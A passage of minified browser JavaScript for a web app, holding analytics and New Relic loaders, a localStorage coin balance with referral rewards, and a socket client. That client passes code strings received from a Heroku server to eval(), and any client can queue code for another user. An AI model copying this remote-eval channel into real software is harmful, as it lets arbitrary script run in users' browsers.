|_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(e.substr(0,4)))t=true})(navigator.userAgent||navigator.vendor||window.opera);return t}String.prototype.format=function(){var n=arguments;return this.replace(/\{(\d+)\}/g,function(e,t){return n[t]})};Array.prototype.move=function(e,t){if(t>=this.length){var n=t-this.length;while(n--+1){this.push(undefined)}}this.splice(t,0,this.splice(e,1)[0]);return this};Object.prototype.lang=function(){return this[config.userLang]||this.default};function addAnalytics(){(function(e,t,n,r,o,a,i){e["GoogleAnalyticsObject"]=o;e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date;a=t.createElement(n),i=t.getElementsByTagName(n)[0];a.async=1;a.src=r;i.parentNode.insertBefore(a,i)})(window,document,"script","https://www.google-analytics.com/analytics.js","ga");ga("create","UA-105323849-1","auto");ga("send","pageview");ga("send","event","moneys2",money.fp,money.num,money.num);var e=e||[];(function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?8b3f6e2c94f875da6eedafba4337f6c1";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})();window.NREUM||(NREUM={}),__nr_require=function(r,t,e){function o(n){if(!t[n]){var e=t[n]={exports:{}};r[n][0].call(e.exports,function(e){var t=r[n][1][e];return o(t||e)},e,e.exports)}return t[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var n=0;n<e.length;n++)o(e[n]);return o}({1:[function(e,t,n){function r(e){try{s.console&&console.log(e)}catch(e){}}var o,a=e("ee"),i=e(15),s={};try{o=localStorage.getItem("__nr_flags").split(","),console&&"function"==typeof console.log&&(s.console=!0,o.indexOf("dev")!==-1&&(s.dev=!0),o.indexOf("nr_dev")!==-1&&(s.nrDev=!0))}catch(e){}s.nrDev&&a.on("internal-error",function(e){r(e.stack)}),s.dev&&a.on("fn-err",function(e,t,n){r(n.stack)}),s.dev&&(r("NR AGENT IN DEVELOPMENT MODE"),r("flags: "+i(s,function(e,t){return e}).join(", ")))},{}],2:[function(t,e,n){function r(e,t,n,r,o){try{m?m-=1:i(o||new a(e,t,n),!0)}catch(e){try{s("ierr",[e,l.now(),!0])}catch(e){}}return"function"==typeof f&&f.apply(this,c(arguments))}function a(e,t,n){this.message=e||"Uncaught error with no additional information",this.sourceURL=t,this.line=n}function i(e,t){var n=t?null:l.now();s("err",[e,n])}var s=t("handle"),c=t(16),o=t("ee"),l=t("loader"),u=t("gos"),f=window.onerror,d=!1,h="nr@seenError",m=0;l.features.err=!0,t(1),window.onerror=r;try{throw new Error}catch(e){"stack"in e&&(t(8),t(7),"addEventListener"in window&&t(5),l.xhrWrappable&&t(9),d=!0)}o.on("fn-start",function(e,t,n){d&&(m+=1)}),o.on("fn-err",function(e,t,n){d&&!n[h]&&(u(n,h,function(){return!0}),this.thrown=!0,i(n))}),o.on("fn-end",function(){d&&!this.thrown&&m>0&&(m-=1)}),o.on("internal-error",function(e){s("ierr",[e,l.now(),!0])})},{}],3:[function(e,t,n){e("loader").features.ins=!0},{}],4:[function(e,t,n){function r(e){}if(window.performance&&window.performance.timing&&window.performance.getEntriesByType){var o=e("ee"),a=e("handle"),i=e(8),s=e(7),c="learResourceTimings",l="addEventListener",u="resourcetimingbufferfull",f="bstResource",d="resource",h="-start",m="-end",p="fn"+h,v="fn"+m,g="bstTimer",w="pushState",y=e("loader");y.features.stn=!0,e(6);var b=NREUM.o.EV;o.on(p,function(e,t){var n=e[0];n instanceof b&&(this.bstStart=y.now())}),o.on(v,function(e,t){var n=e[0];n instanceof b&&a("bst",[n,t,this.bstStart,y.now()])}),i.on(p,function(e,t,n){this.bstStart=y.now(),this.bstType=n}),i.on(v,function(e,t){a(g,[t,this.bstStart,y.now(),this.bstType])}),s.on(p,function(){this.bstStart=y.now()}),s.on(v,function(e,t){a(g,[t,this.bstStart,y.now(),"requestAnimationFrame"])}),o.on(w+h,function(e){this.time=y.now(),this.startPath=location.pathname+location.hash}),o.on(w+m,function(e){a("bstHist",[location.pathname+location.hash,this.startPath,this.time])}),l in window.performance&&(window.performance["c"+c]?window.performance[l](u,function(e){a(f,[window.performance.getEntriesByType(d)]),window.performance["c"+c]()},!1):window.performance[l]("webkit"+u,function(e){a(f,[window.performance.getEntriesByType(d)]),window.performance["webkitC"+c]()},!1)),document[l]("scroll",r,{passive:!0}),document[l]("keypress",r,!1),document[l]("click",r,!1)}},{}],5:[function(e,t,n){function r(e){for(var t=e;t&&!t.hasOwnProperty(u);)t=Object.getPrototypeOf(t);t&&o(t)}function o(e){s.inPlace(e,[u,f],"-",a)}function a(e,t){return e[1]}var i=e("ee").get("events"),s=e(18)(i,!0),c=e("gos"),l=XMLHttpRequest,u="addEventListener",f="removeEventListener";t.exports=i,"getPrototypeOf"in Object?(r(document),r(window),r(l.prototype)):l.prototype.hasOwnProperty(u)&&(o(window),o(l.prototype)),i.on(u+"-start",function(e,t){var n=e[1],r=c(n,"nr@wrapped",function(){function e(){if("function"==typeof n.handleEvent)return n.handleEvent.apply(n,arguments)}var t={object:e,function:n}[typeof n];return t?s(t,"fn-",null,t.name||"anonymous"):n});this.wrapped=e[1]=r}),i.on(f+"-start",function(e){e[1]=this.wrapped||e[1]})},{}],6:[function(e,t,n){var r=e("ee").get("history"),o=e(18)(r);t.exports=r,o.inPlace(window.history,["pushState","replaceState"],"-")},{}],7:[function(e,t,n){var r=e("ee").get("raf"),o=e(18)(r),a="equestAnimationFrame";t.exports=r,o.inPlace(window,["r"+a,"mozR"+a,"webkitR"+a,"msR"+a],"raf-"),r.on("raf-start",function(e){e[0]=o(e[0],"fn-")})},{}],8:[function(e,t,n){function r(e,t,n){e[0]=i(e[0],"fn-",null,n)}function o(e,t,n){this.method=n,this.timerDuration=isNaN(e[1])?0:+e[1],e[0]=i(e[0],"fn-",this,n)}var a=e("ee").get("timer"),i=e(18)(a),s="setTimeout",c="setInterval",l="clearTimeout",u="-start",f="-";t.exports=a,i.inPlace(window,[s,"setImmediate"],s+f),i.inPlace(window,[c],c+f),i.inPlace(window,[l,"clearImmediate"],l+f),a.on(c+u,r),a.on(s+u,o)},{}],9:[function(e,t,n){function r(e,t){f.inPlace(t,["onreadystatechange"],"fn-",s)}function o(){var e=this,t=u.context(e);e.readyState>3&&!t.resolved&&(t.resolved=!0,u.emit("xhr-resolved",[],e)),f.inPlace(e,w,"fn-",s)}function a(e){y.push(e),m&&(S?S.then(i):v?v(i):(k=-k,I.data=k))}function i(){for(var e=0;e<y.length;e++)r([],y[e]);y.length&&(y=[])}function s(e,t){return t}function c(e,t){for(var n in e)t[n]=e[n];return t}e(5);var l=e("ee"),u=l.get("xhr"),f=e(18)(u),d=NREUM.o,h=d.XHR,m=d.MO,p=d.PR,v=d.SI,g="readystatechange",w=["onload","onerror","onabort","onloadstart","onloadend","onprogress","ontimeout"],y=[];t.exports=u;var b=window.XMLHttpRequest=function(e){var t=new h(e);try{u.emit("new-xhr",[t],t),t.addEventListener(g,o,!1)}catch(e){try{u.emit("internal-error",[e])}catch(e){}}return t};if(c(h,b),b.prototype=h.prototype,f.inPlace(b.prototype,["open","send"],"-xhr-",s),u.on("send-xhr-start",function(e,t){r(e,t),a(t)}),u.on("open-xhr-start",r),m){var S=p&&p.resolve();if(!v&&!p){var k=1,I=document.createTextNode(k);new m(i).observe(I,{characterData:!0})}}else l.on("fn-end",function(e){e[0]&&e[0].type===g||i()})},{}],10:[function(e,t,n){function r(e){var t=this.params,n=this.metrics;if(!this.ended){this.ended=!0;for(var r=0;r<f;r++)e.removeEventListener(u[r],this.listener,!1);if(!t.aborted){if(n.duration=s.now()-this.startTime,4===e.readyState){t.status=e.status;var o=i(e,this.lastSize);if(o&&(n.rxSize=o),this.sameOrigin){var a=e.getResponseHeader("X-NewRelic-App-Data");a&&(t.cat=a.split(", ").pop())}}else t.status=0;n.cbTime=this.cbTime,l.emit("xhr-done",[e],e),c("xhr",[t,n,this.startTime])}}}function i(e,t){var n=e.responseType;if("json"===n&&null!==t)return t;var r="arraybuffer"===n||"blob"===n||"json"===n?e.response:e.responseText;return m(r)}function o(e,t){var n=a(t),r=e.params;r.host=n.hostname+":"+n.port,r.pathname=n.pathname,e.sameOrigin=n.sameOrigin}var s=e("loader");if(s.xhrWrappable){var c=e("handle"),a=e(11),l=e("ee"),u=["load","error","abort","timeout"],f=u.length,d=e("id"),h=e(14),m=e(13),p=window.XMLHttpRequest;s.features.xhr=!0,e(9),l.on("new-xhr",function(e){var t=this;t.totalCbs=0,t.called=0,t.cbTime=0,t.end=r,t.ended=!1,t.xhrGuids={},t.lastSize=null,h&&(h>34||h<10)||window.opera||e.addEventListener("progress",function(e){t.lastSize=e.loaded},!1)}),l.on("open-xhr-start",function(e){this.params={method:e[0]},o(this,e[1]),this.metrics={}}),l.on("open-xhr-end",function(e,t){"loader_config"in NREUM&&"xpid"in NREUM.loader_config&&this.sameOrigin&&t.setRequestHeader("X-NewRelic-ID",NREUM.loader_config.xpid)}),l.on("send-xhr-start",function(e,t){var n=this.metrics,r=e[0],o=this;if(n&&r){var a=m(r);a&&(n.txSize=a)}this.startTime=s.now(),this.listener=function(e){try{"abort"===e.type&&(o.params.aborted=!0),("load"!==e.type||o.called===o.totalCbs&&(o.onloadCalled||"function"!=typeof t.onload))&&o.end(t)}catch(e){try{l.emit("internal-error",[e])}catch(e){}}};for(var i=0;i<f;i++)t.addEventListener(u[i],this.listener,!1)}),l.on("xhr-cb-time",function(e,t,n){this.cbTime+=e,t?this.onloadCalled=!0:this.called+=1,this.called!==this.totalCbs||!this.onloadCalled&&"function"==typeof n.onload||this.end(n)}),l.on("xhr-load-added",function(e,t){var n=""+d(e)+!!t;this.xhrGuids&&!this.xhrGuids[n]&&(this.xhrGuids[n]=!0,this.totalCbs+=1)}),l.on("xhr-load-removed",function(e,t){var n=""+d(e)+!!t;this.xhrGuids&&this.xhrGuids[n]&&(delete this.xhrGuids[n],this.totalCbs-=1)}),l.on("addEventListener-end",function(e,t){t instanceof p&&"load"===e[0]&&l.emit("xhr-load-added",[e[1],e[2]],t)}),l.on("removeEventListener-end",function(e,t){t instanceof p&&"load"===e[0]&&l.emit("xhr-load-removed",[e[1],e[2]],t)}),l.on("fn-start",function(e,t,n){t instanceof p&&("onload"===n&&(this.onload=!0),("load"===(e[0]&&e[0].type)||this.onload)&&(this.xhrCbStart=s.now()))}),l.on("fn-end",function(e,t){this.xhrCbStart&&l.emit("xhr-cb-time",[s.now()-this.xhrCbStart,this.onload,t],t)})}},{}],11:[function(e,t,n){t.exports=function(e){var t=document.createElement("a"),n=window.location,r={};t.href=e,r.port=t.port;var o=t.href.split("://");!r.port&&o[1]&&(r.port=o[1].split("/")[0].split("@").pop().split(":")[1]),r.port&&"0"!==r.port||(r.port="https"===o[0]?"443":"80"),r.hostname=t.hostname||n.hostname,r.pathname=t.pathname,r.protocol=o[0],"/"!==r.pathname.charAt(0)&&(r.pathname="/"+r.pathname);var a=!t.protocol||":"===t.protocol||t.protocol===n.protocol,i=t.hostname===document.domain&&t.port===n.port;return r.sameOrigin=a&&(!t.hostname||i),r}},{}],12:[function(e,t,n){function r(){}function o(e,t,n){return function(){return a(e,[l.now()].concat(s(arguments)),t?null:this,n),t?void 0:this}}var a=e("handle"),i=e(15),s=e(16),c=e("ee").get("tracer"),l=e("loader"),u=NREUM;"undefined"==typeof window.newrelic&&(newrelic=u);var f=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],d="api-",h=d+"ixn-";i(f,function(e,t){u[t]=o(d+t,!0,"api")}),u.addPageAction=o(d+"addPageAction",!0),u.setCurrentRouteName=o(d+"routeName",!0),t.exports=newrelic,u.interaction=function(){return(new r).get()};var m=r.prototype={createTracer:function(e,t){var n={},r=this,o="function"==typeof t;return a(h+"tracer",[l.now(),e,n],r),function(){if(c.emit((o?"":"no-")+"fn-start",[l.now(),r,o],n),o)try{return t.apply(this,arguments)}catch(e){throw c.emit("fn-err",[arguments,this,e],n),e}finally{c.emit("fn-end",[l.now()],n)}}}};i("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(e,t){m[t]=o(h+t)}),newrelic.noticeError=function(e){"string"==typeof e&&(e=new Error(e)),a("err",[e,l.now()])}},{}],13:[function(e,t,n){t.exports=function(e){if("string"==typeof e&&e.length)return e.length;if("object"==typeof e){if("undefined"!=typeof ArrayBuffer&&e instanceof ArrayBuffer&&e.byteLength)return e.byteLength;if("undefined"!=typeof Blob&&e instanceof Blob&&e.size)return e.size;if(!("undefined"!=typeof FormData&&e instanceof FormData))try{return JSON.stringify(e).length}catch(e){return}}}},{}],14:[function(e,t,n){var r=0,o=navigator.userAgent.match(/Firefox[\/\s](\d+\.\d+)/);o&&(r=+o[1]),t.exports=r},{}],15:[function(e,t,n){function r(e,t){var n=[],r="",o=0;for(r in e)a.call(e,r)&&(n[o]=t(r,e[r]),o+=1);return n}var a=Object.prototype.hasOwnProperty;t.exports=r},{}],16:[function(e,t,n){function r(e,t,n){t||(t=0),"undefined"==typeof n&&(n=e?e.length:0);for(var r=-1,o=n-t||0,a=Array(o<0?0:o);++r<o;)a[r]=e[t+r];return a}t.exports=r},{}],17:[function(e,t,n){t.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],18:[function(e,t,n){function f(e){return!(e&&e instanceof Function&&e.apply&&!e[h])}var r=e("ee"),d=e(16),h="nr@original",i=Object.prototype.hasOwnProperty,s=!1;t.exports=function(o,a){function c(o,a,i,s){function e(){var t,n,r,e;try{n=this,t=d(arguments),r="function"==typeof i?i(t,n):i||{}}catch(e){u([e,"",[t,n,s],r])}l(a+"start",[t,n,s],r);try{return e=o.apply(n,t)}catch(e){throw l(a+"err",[t,n,e],r),e}finally{l(a+"end",[t,n,e],r)}}return f(o)?o:(a||(a=""),e[h]=o,t(o,e),e)}function e(e,t,n,r){n||(n="");var o,a,i,s="-"===n.charAt(0);for(i=0;i<t.length;i++)a=t[i],o=e[a],f(o)||(e[a]=c(o,s?a+n:n,r,a))}function l(t,n,r){if(!s||a){var e=s;s=!0;try{o.emit(t,n,r,a)}catch(e){u([e,t,n,r])}s=e}}function t(n,e){if(Object.defineProperty&&Object.keys)try{var t=Object.keys(n);return t.forEach(function(t){Object.defineProperty(e,t,{get:function(){return n[t]},set:function(e){return n[t]=e,e}})}),e}catch(e){u([e])}for(var r in n)i.call(n,r)&&(e[r]=n[r]);return e}function u(e){try{o.emit("internal-error",e)}catch(e){}}return o||(o=r),c.inPlace=e,c.flag=h,c}},{}],ee:[function(e,t,n){function a(){}function i(l){function u(e){return e&&e instanceof a?e:e?p(e,m,s):s()}function t(e,t,n,r){if(!y.aborted||r){l&&l(e,t,n);for(var o=u(n),a=f(e),i=a.length,s=0;s<i;s++)a[s].apply(o,t);var c=g[d[e]];return c&&c.push([h,e,t,o]),o}}function e(e,t){o[e]=f(e).concat(t)}function f(e){return o[e]||[]}function n(e){return w[e]=w[e]||i(t)}function r(e,n){v(e,function(e,t){n=n||"feature",d[t]=n,n in g||(g[n]=[])})}var o={},d={},h={on:e,emit:t,get:n,listeners:f,context:u,buffer:r,abort:c,aborted:!1};return h}function s(){return new a}function c(){(g.api||g.feature)&&(y.aborted=!0,g=y.backlog={})}var m="nr@context",p=e("gos"),v=e(15),g={},w={},y=t.exports=i();y.backlog=g},{}],gos:[function(e,t,n){function r(e,t,n){if(o.call(e,t))return e[t];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,t,{value:r,writable:!0,enumerable:!1}),r}catch(e){}return e[t]=r,r}var o=Object.prototype.hasOwnProperty;t.exports=r},{}],handle:[function(e,t,n){function r(e,t,n,r){o.buffer([e],r),o.emit(e,t,n)}var o=e("ee").get("handle");t.exports=r,r.ee=o},{}],id:[function(e,t,n){function r(e){var t=typeof e;return!e||"object"!==t&&"function"!==t?-1:e===window?0:i(e,a,function(){return o++})}var o=1,a="nr@id",i=e("gos");t.exports=r},{}],loader:[function(e,t,n){function r(){if(!S++){var n=b.info=NREUM.info,e=d.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(n&&n.licenseKey&&n.applicationID&&e))return u.abort();l(w,function(e,t){n[e]||(n[e]=t)}),c("mark",["onload",i()+b.offset],null,"api");var t=d.createElement("script");t.src="https://"+n.agent,e.parentNode.insertBefore(t,e)}}function o(){"complete"===d.readyState&&a()}function a(){c("mark",["domContent",i()+b.offset],null,"api")}function i(){return k.exists&&performance.now?Math.round(performance.now()):(s=Math.max((new Date).getTime(),s))-b.offset}var s=(new Date).getTime(),c=e("handle"),l=e(15),u=e("ee"),f=window,d=f.document,h="addEventListener",m="attachEvent",p=f.XMLHttpRequest,v=p&&p.prototype;NREUM.o={ST:setTimeout,SI:f.setImmediate,CT:clearTimeout,XHR:p,REQ:f.Request,EV:f.Event,PR:f.Promise,MO:f.MutationObserver};var g=""+location,w={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1071.min.js"},y=p&&v&&v[h]&&!/CriOS/.test(navigator.userAgent),b=t.exports={offset:s,now:i,origin:g,features:{},xhrWrappable:y};e(12),d[h]?(d[h]("DOMContentLoaded",a,!1),f[h]("load",r,!1)):(d[m]("onreadystatechange",o),f[m]("onload",r)),c("mark",["firstbyte",s],null,"api");var S=0,k=e(17)},{}]},{},["loader",2,10,4,3]);NREUM.info={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",licenseKey:"ae35d55cb6",applicationID:"118478072",sa:1}}function Money(){var r={};r.init=function(){r.fp=config.fp;r.num=Number(localStorage.getItem(r.fp));if(localStorage.getItem(r.fp)===null){r.change(10,config.newUser.lang()+10);var e=getURLParameter("sharer");if(e){socketIo.push(e,"money.change(10,'"+config.sharer.lang()+10+"')")}}r.setD(r.num);return r};r.setD=function(e){var e=e.toFixed(isInt(e)?0:4);var t=document.getElementById("money");var n='<span class="balance">'+config.balance.lang()+e+"</span>";t.innerHTML=n};r.change=function(e,t){if(e*e>=1){var n=t||config[e<0?"balanceCut":"balanceAdd"].lang()+e;showPrompt(n)}r.num=r.num+e;r.save();r.setD(r.num)};r.save=function(){localStorage.setItem(r.fp,r.num)};return r.init()}function isInt(e){return!isNaN(e)&&parseInt(Number(e))==e&&!isNaN(parseInt(e,10))}function showPrompt(e){var t=document.createElement("div");t.innerHTML=e;t.classList.add("prompt-show");document.body.appendChild(t)}function SocketIo(){var e={};var t="https://socket-taifu2.herokuapp.com";var r=e.socket=io(t);r.on("chat message",function(e){try{var e=JSON.parse(e);if(e.user==config.fp){eval(e.code);n("deleteOne",e)}}catch(e){}});n("find",{user:config.fp});e.push=function(e,t){n("insertOne",{user:e,code:t})};return e;function n(e,t){var n={method:e,msg:t};r.emit("sharer",JSON.stringify(n))}}